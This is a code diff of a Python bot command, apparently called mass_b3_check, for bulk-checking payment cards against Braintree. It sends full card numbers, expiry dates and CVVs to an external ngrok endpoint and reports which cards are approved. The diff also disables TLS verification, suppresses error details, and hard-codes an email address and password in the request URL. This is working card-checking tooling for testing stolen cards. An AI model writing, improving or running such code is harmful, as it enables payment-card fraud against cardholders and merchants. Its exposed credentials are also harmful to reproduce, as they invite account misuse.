@@ -1,4 +1,3 @@
-# commands/mass_b3_check.py
 import sys
 import os
 import time
@@ -129,29 +128,86 @@ def process_single_b3_card(card_data, card_number):
             return f"❌ Tarjeta {card_number}: Año inválido", False
         
         # URL de Braintree
-        braintree_url = f"https://componential-unstruggling-shantel.ngrok-free.dev//check_cc?cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&email=wasdark336@gmail.com&password=bbmEZs65p!BJLNz"
+        braintree_url = f"https://componential-unstruggling-shantel.ngrok-free.dev/check_cc?cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&email=wasdark336@gmail.com&password=bbmEZs65p!BJLNz"
         
-        response = requests.get(braintree_url, timeout=30).text
+        response = make_simple_request(braintree_url)
         
-                # Procesar respuesta
-        status = "Declined"
-        is_approved = False
+        # ✅ CORREGIDO: Extraer status y response exactos del JSON
+        status = extract_status_from_response(response)
+        result_message = extract_result_from_response(response)
         
-        try:
-            data = json.loads(response)
-            if data.get("status", "").lower() == "approved" or "approved" in str(data.get("response", "")).lower():
-                status = "Approved"
-                is_approved = True
-        except:
-            if "approved" in response.lower():
-                status = "APPROVED ✅"
-                is_approved = True
+        # Determinar si fue aprobada (basado en el status real)
+        is_approved = "approved" in str(status).lower() or "✅" in str(status)
         
         bin_info = get_bin_info(cc_number[:6])
-        status_clean = status.replace("✅", "").replace("❌", "").replace("🔄", "").replace("⚠️", "").strip()
-        result_text = f"🝮 {card_number}. {cc_number}|{expiry_month}|{expiry_year}|{cvv} | {status_clean} | {bin_info['scheme']}"
+        
+        # ✅ CORREGIDO: Formatear resultado como quieres
+        # 🝮 1. 4283311523877976|06|26|122 | Declined | No account
+        result_text = f"🝮 {card_number}. {cc_number}|{expiry_month}|{expiry_year}|{cvv} | {status} | {result_message}"
         
         return result_text, is_approved
     
     except Exception as e:
         return f"❌ Tarjeta {card_number}: Error", False
+
+def make_simple_request(url):
+    """Hace una solicitud simple - oculta errores técnicos"""
+    try:
+        response = requests.get(url, timeout=90, verify=False)
+        return response.text
+    except Exception:
+        # ❌ NO mostrar detalles técnicos
+        return "SERVER_UNAVAILABLE"
+
+def extract_status_from_response(response):
+    """Extrae EXACTAMENTE el campo 'status' del JSON"""
+    if response == "SERVER_UNAVAILABLE":
+        return "Gateway Offline ⚠️"
+    
+    try:
+        data = json.loads(response)
+        # ✅ EXTRAER DIRECTAMENTE el campo "status" 
+        status = data.get("status", "Unknown")
+        
+        # Convertir \u274c a ❌ y otros emojis Unicode
+        if isinstance(status, str):
+            status = status.replace("\\u274c", "❌").replace("\\u2705", "✅")
+        
+        return str(status)
+    except:
+        return "Unknown"
+
+def extract_result_from_response(response):
+    """Extrae EXACTAMENTE el campo 'response' o 'error' del JSON"""
+    if response == "SERVER_UNAVAILABLE":
+        return "Gateway no disponible - intenta más tarde"
+    
+    try:
+        data = json.loads(response)
+        
+        # ✅ PRIORIDAD 1: campo "response"
+        if "response" in data and data["response"]:
+            result = data["response"]
+            if isinstance(result, str):
+                result = result.replace("\\u274c", "❌").replace("\\u2705", "✅")
+            return str(result)
+        
+        # ✅ PRIORIDAD 2: campo "error"  
+        elif "error" in data and data["error"]:
+            result = data["error"]
+            if isinstance(result, str):
+                result = result.replace("\\u274c", "❌").replace("\\u2705", "✅")
+            return str(result)
+        
+        # ✅ PRIORIDAD 3: campo "message"
+        elif "message" in data and data["message"]:
+            result = data["message"]
+            if isinstance(result, str):
+                result = result.replace("\\u274c", "❌").replace("\\u2705", "✅")
+            return str(result)
+            
+        else:
+            return "No response data"
+            
+    except:
+        return "Invalid response format"
